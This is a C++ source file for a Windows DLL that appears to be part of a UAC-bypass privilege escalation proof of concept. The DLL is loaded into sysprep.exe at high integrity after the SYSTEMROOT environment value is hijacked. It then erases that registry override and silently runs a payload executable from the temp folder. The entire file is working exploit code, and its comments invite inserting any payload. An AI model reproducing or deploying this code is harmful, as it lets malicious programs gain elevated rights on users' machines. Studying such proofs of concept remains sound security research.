#include <string>
#include <Windows.h>
using namespace std;

void DeleteRegistryValue(HKEY key, wstring path, wstring name);
wstring GetTempFolderPath();

bool WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		// We now run in sysprep.exe with high IL

		// Restore %SYSTEMROOT% immediately
		DeleteRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT");

		// Execute Payload.exe
		// Basically, any payload can be implemented from here on and it doesn't necessarily have to be a separate executable
		// If you can guarantee stability within *this* context, you can also just write down your payload here...
		CreateProcessW((GetTempFolderPath() + L"\\SysprepVolatileEnvironmentLPE\\Payload.exe").c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &STARTUPINFOW(), &PROCESS_INFORMATION());

		// Job done. Close System Preparation Tool, thank you.
		ExitProcess(0);
	}

	return true;
}



void DeleteRegistryValue(HKEY key, wstring path, wstring name)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteValueW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}